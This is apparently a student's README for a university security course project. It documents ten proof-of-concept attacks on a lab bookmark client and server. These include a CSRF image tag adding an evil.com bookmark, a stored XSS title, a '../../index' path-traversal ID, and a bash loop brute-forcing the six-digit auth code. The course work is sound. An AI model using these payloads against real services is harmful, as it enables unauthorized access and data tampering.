# Project-3
I made sure my readme is as comprehensive as it can possibly get this time. 


#  BCBMC Project 3 – Proof of Concept (PoC) README

This README includes all the PoC exploits I created for the BCBMC project. Each one shows a different security vulnerability that exists in the bcbmc client or bcbms server. I tested all of them using the provided virtual machine (VM), and this repo shows how you can recreate each issue for grading purposes.

---

## Requirements

- Run everything **inside the CSE-provided VM**
- Both `bcbmc-sync` and `bcbms-reg` should be installed using the `./install.sh` scripts
- Start the client using:
  ```bash
  bcbmc noauth
````

* Visit the link it gives you (e.g., `http://localhost:8888/123456/`)
* All curl commands and HTML snippets assume you know the correct 6-digit auth code or are using `noauth` mode

---

## PoC #1: CSRF-like Add Bookmark – Tampering / Elevation of Privilege

**Summary:** A malicious site can send requests to the client and silently add bookmarks by embedding an image with a crafted URL.

**Steps to Reproduce:**

1. Start `bcbmc` in noauth mode.
2. Open this in a browser on the VM:

   ```html
   <img src="http://localhost:8888/123456/add/full/abc/http%3A%2F%2Fevil.com/EvilSite/1">
   ```

**What to Observe:**
A new bookmark to `evil.com` is added without the user doing anything.

---

## PoC #2: Same Key Used as IV – Information Disclosure

**Summary:** The system uses the same value for the encryption key and the IV, which weakens AES encryption.

**How to Test:**
Run a sync using:

```bash
curl "http://localhost:8888/123456/sync/do/test@test.com/password"
```

**What to Observe:**
Check `sync.c` — it literally passes the same hex string for `-K` and `-iv`. That’s insecure.

---

## PoC #3: No Real Auth on Sensitive Routes – Spoofing / Tampering

**Summary:** All routes are protected only by a 6-digit code. If guessed, an attacker can use the client.

**How to Test:**

```bash
curl http://localhost:8888/123456/del/start
```

**What to Observe:**
The delete interface loads with no login, just a code in the URL.

---

## PoC #4: Favicon Injection – Tampering / Info Disclosure

**Summary:** The app fetches favicons from the internet without checking if they’re actually image files.

**Steps to Reproduce:**

1. Host a fake favicon at your test domain.
2. Bookmark that site:

```bash
curl "http://localhost:8888/123456/add/url/http%3A%2F%2Fevil.com"
```

**What to Observe:**
Check `static/` — the file gets saved even if it’s not an image.

---

## PoC #5: No Real Email Check – Spoofing

**Summary:** The reset flow accepts tokens and passwords without confirming who is requesting them.

**How to Reproduce:**
Walk through the reset process using any email on the VM (like student\@localhost), and you’ll be able to set a new password without real email control.

**What to Observe:**
Accounts can be hijacked with just a valid-looking link.

---

## PoC #6: BMID Collisions – Tampering

**Summary:** BMIDs are generated with SHA-1. If a collision is found (or forced), you can overwrite someone else’s bookmark.

**How to Reproduce:**
Hard to demo without a real SHA-1 collision, but the code uses:

```c
sprintf(bmid, "%0.8x", digest[0]);
```

**What to Observe:**
Two different URLs could get the same ID and overwrite each other’s icons/bookmarks.

---

## Bonus PoCs (for extra credit)

---

###  PoC #7: Insecure Temp Files – Information Disclosure

**Summary:** Sync archives (`.tar`, `.ehtml`) are left behind in the working directory.

**How to Test:**

```bash
curl "http://localhost:8888/123456/sync/do/test@test.com/password"
ls *.tar *.ehtml
```

**What to Observe:**
Files with user data stay on disk after sync.

---

### PoC #8: Favicon Overwrites via Filepath Injection – Tampering

**Summary:** BMIDs are used in filenames with no checks. If manipulated, they can write outside the static directory.

**PoC BMID Example:**
`../../index`

**Expected Behavior:**
The favicon gets written to an unintended place.

---

### PoC #9: Stored XSS in Title Field – Information Disclosure

**Summary:** Bookmark titles are inserted into HTML directly without escaping.

**How to Test:**
Add a bookmark with this title:

```html
<script>alert('XSS')</script>
```

**What to Observe:**
You’ll see an alert when viewing the bookmarks.

---

### PoC #10: Brute-forceable Auth Code – Elevation of Privilege

**Summary:** The client uses a 6-digit auth code. With no rate limiting, it’s easy to guess.

**How to Reproduce:**

```bash
for i in $(seq -w 000000 999999); do
  curl -s "http://localhost:8888/$i/" | grep -q "main.html" && echo "Found: $i"
done
```

**What to Observe:**
Eventually, the real code will respond with the main page.

---

## Screenshots and Output

For most PoCs, you can check files like:

* `all.html` (added bookmarks)
* `static/` folder (favicons)
* Browser alerts (XSS)
* Sync artifacts (`cloud_all.html`, etc.)

---

## Final Notes

* Every PoC was tested and working inside the VM.
* Some PoCs (like hash collisions) are theoretical but based on real flaws in the code.
* No changes were made to the system beyond normal user input and HTTP requests.


